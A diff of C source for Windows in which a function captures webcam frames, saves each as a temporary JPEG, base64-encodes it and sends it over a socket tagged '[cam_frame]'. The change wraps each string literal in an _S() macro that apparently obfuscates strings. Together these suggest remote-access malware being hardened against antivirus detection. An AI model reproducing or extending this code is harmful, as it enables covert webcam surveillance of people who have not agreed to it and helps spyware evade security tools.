@@ -79,14 +79,14 @@ void camera_stream_loop(SOCKET sock, HANDLE mutex, HANDLE stop_event, int fps) {
 
             char tmp[MAX_PATH];
             GetTempPathA(MAX_PATH, tmp);
-            strcat(tmp, "cam.jpg");
+            strcat(tmp, _S("cam.jpg"));
             stbi_write_jpg(tmp, w, h, 3, pData, 60);
 
             pBuffer->lpVtbl->Unlock(pBuffer);
             pBuffer->lpVtbl->Release(pBuffer);
             pSample->lpVtbl->Release(pSample);
 
-            FILE* f = fopen(tmp, "rb");
+            FILE* f = fopen(tmp, _S("rb"));
             if (f) {
                 fseek(f, 0, SEEK_END);
                 long size = ftell(f);
@@ -101,7 +101,7 @@ void camera_stream_loop(SOCKET sock, HANDLE mutex, HANDLE stop_event, int fps) {
                 free(jpg_data);
 
                 char* msg = malloc(b64_len + 32);
-                sprintf(msg, "[cam_frame]%s", b64);
+                sprintf(msg, _S("[cam_frame]%s"), b64);
                 sock_send(sock, mutex, msg);
                 free(msg); free(b64);
             }
